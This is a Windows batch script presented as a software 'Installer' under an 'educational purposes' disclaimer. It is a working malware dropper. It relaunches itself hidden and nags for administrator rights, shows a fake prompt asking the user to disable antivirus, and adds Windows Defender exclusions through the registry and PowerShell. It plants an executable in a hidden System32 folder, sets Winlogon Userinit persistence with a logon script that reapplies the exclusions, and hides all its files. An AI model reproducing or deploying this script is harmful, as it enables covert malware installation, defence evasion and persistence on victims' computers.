::  __  __       _          _    ____ 
:: |  \/  | __ _| |_ ___   / \  / ___|
:: | |\/| |/ _` | __/ _ \ / _ \| |  _ 
:: | |  | | (_| | ||  __// ___ \ |_| |
:: |_|  |_|\__,_|\__\___/_/   \_\____|
::
:: © Copyright 2026 - MateAG
:: All rights reserved. Any copy without 
:: consent of this code will be reported.
::
:: ℹ > This project is only for educational purposes.
:: The creator is NOT responsible of any illegal/malicious use
:: of this project.
::
:: The creator advices you to use this for testing and
:: legal activities. If you want to install this on
:: someone else computer, please ask them for the
:: permission to.
::
:: Thank you and happy testing! <3

@echo off
title Installer
setlocal enabledelayedexpansion

if "%~1"=="-invisible" goto :UAC
powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '-invisible' -WindowStyle Hidden"
exit /b

:UAC
net session >nul 2>&1
if %errorlevel%==0 goto :code

powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden" -ErrorAction SilentlyContinue
if %errorlevel% neq 0 (
    goto UAC
    cls
)
exit /b
cls

:code
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Please, disable your computer antivirus/firewall to avoid permission errors.', 'MateAG', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)"
setlocal enabledelayedexpansion
takeown /f "C:\Windows\System32\ZZZ_Security" /r /d y
mkdir C:\Windows\System32\ZZZ_Security
takeown /f "C:\Windows\System32\ZZZ_Security" /r /d y
icacls "C:\Windows\System32\ZZZ_Security" /grant administrators:F /t
set "vbsFile=%temp%\prompt.vbs"

> "%vbsFile%" echo filename = InputBox("Please introduce your executable name without the file extension:", "MateAG")
>> "%vbsFile%" echo WScript.Echo filename
>> "%vbsFile%" echo WScript.Echo link

set "counter=0"
for /f "delims=" %%a in ('cscript //nologo "%vbsFile%"') do (
    set /a counter+=1
    if !counter! == 1 set "FILE=%%a"
)

del "%vbsFile%"

taskkill -f -im %FILE%.exe

set "paths=C:\Program Files\Executable-213njkb1\pys_exe.exe C:\Program Files\Executable-213njkb1\ C:\Users\%username%\%FILE%\%FILE%.exe C:\Users\%username%\AppData\Roaming\%FILE%\%FILE%.exe C:\Users\%username%\%FILE%\%FILE%.exe C:\Windows\System32\ZZZ_Security\%FILE%.exe"
set "procs=%FILE%.exe %FILE%.exe* reg.exe reg.exe* pys_exe.exe pys_exe.exe*"

for %%p in (%paths%) do (
    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%%p" /t REG_DWORD /d 0 /f >nul 2>&1
)

for %%p in (%procs%) do (
    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%p" /t REG_DWORD /d 0 /f >nul 2>&1
)

powershell -Command "$paths = @('C:\Program Files\Executable-213njkb1\pys_exe.exe', 'C:\Program Files\Executable-213njkb1\', 'C:\Users\%username%\%FILE%\%FILE%.exe', 'C:\Users\%username%\AppData\Roaming\%FILE%\%FILE%.exe', 'C:\Users\%username%\%FILE%\%FILE%.exe'); $procs = @('%FILE%.exe', '%FILE%.exe*', 'reg.exe', 'reg.exe*'); foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }; foreach ($proc in $procs) { Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue }"

start /b C:\Windows\System32\ZZZ_Security\%FILE%.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\ZZZ_Security\%FILE%.exe, C:\Windows\System32\ZZZ_Security\init.bat, C:\Windows\System32\userinit.exe" /f

pushd "%~dp0\files"
move "%FILE%.exe" "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
mkdir C:\Program Files\Executable-213njkb1

copy /Y "C:\Windows\System32\ZZZ_Security\%FILE%.exe" "C:\Program Files\Executable-213njkb1\pys_exe.exe"
takeown /f "C:\Program Files\Executable-213njkb1" /r /d y
icacls "C:\Program Files\Executable-213njkb1" /grant administrators:F /t
attrib +h "C:\Program Files\Executable-213njkb1"
attrib +h "C:\Program Files\Executable-213njkb1\pys_exe.exe"

set "initScript=C:\Windows\System32\ZZZ_Security\init.bat"
(
echo set "paths=C:\Program Files\Executable-213njkb1\pys_exe.exe C:\Program Files\Executable-213njkb1\ C:\Users\%username%\%FILE%\%FILE%.exe C:\Users\%username%\AppData\Roaming\%FILE%\%FILE%.exe C:\Users\%username%\%FILE%\%FILE%.exe C:\Windows\System32\ZZZ_Security\%FILE%.exe"
echo set "procs=%FILE%.exe %FILE%.exe* reg.exe reg.exe* pys_exe.exe pys_exe.exe*"

echo for %%p in (%paths%) do (
echo     reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%%p" /t REG_DWORD /d 0 /f >nul 2>&1
echo )

echo for %%p in (%procs%) do (
echo     reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%p" /t REG_DWORD /d 0 /f >nul 2>&1
echo )

echo powershell -Command "$paths = @('C:\Program Files\Executable-213njkb1\pys_exe.exe', 'C:\Program Files\Executable-213njkb1\', 'C:\Users\%username%\%FILE%\%FILE%.exe', 'C:\Users\%username%\AppData\Roaming\%FILE%\%FILE%.exe', 'C:\Users\%username%\%FILE%\%FILE%.exe'); $procs = @('%FILE%.exe', '%FILE%.exe*', 'reg.exe', 'reg.exe*'); foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }; foreach ($proc in $procs) { Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue }"

echo reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\ZZZ_Security\%FILE%.exe, C:\Windows\System32\ZZZ_Security\init.bat, C:\Windows\System32\userinit.exe" /f

echo attrib +h "C:\Users\%username%\%FILE%"
echo attrib +h "C:\Users\%username%\%FILE%.exe"
echo attrib +h "C:\Windows\System32\ZZZ_Security"
echo attrib +h "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
echo attrib +h "C:\Windows\System32\ZZZ_Security\init.bat"
echo reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FILE%" /f
echo attrib +h "C:\Program Files\Executable-213njkb1"
echo attrib +h "C:\Program Files\Executable-213njkb1\pys_exe.exe"

echo copy /Y "C:\Windows\System32\ZZZ_Security\init.bat" "C:\Program Files\Executable-213njkb1\init_bat.bat"
) > "%initScript%"

copy /Y "C:\Windows\System32\ZZZ_Security\init.bat" "C:\Program Files\Executable-213njkb1\init_bat.bat"
attrib +h "C:\Program Files\Executable-213njkb1\init_bat.bat"

attrib +h "C:\Users\%username%\%FILE%"
attrib +h "C:\Users\%username%\%FILE%.exe"
attrib +h "C:\Windows\System32\ZZZ_Security"
attrib +h "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
attrib +h "C:\Windows\System32\ZZZ_Security\init.bat"
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FILE%" /f

powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('The software was installed sucessfully.', 'MateAG', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)"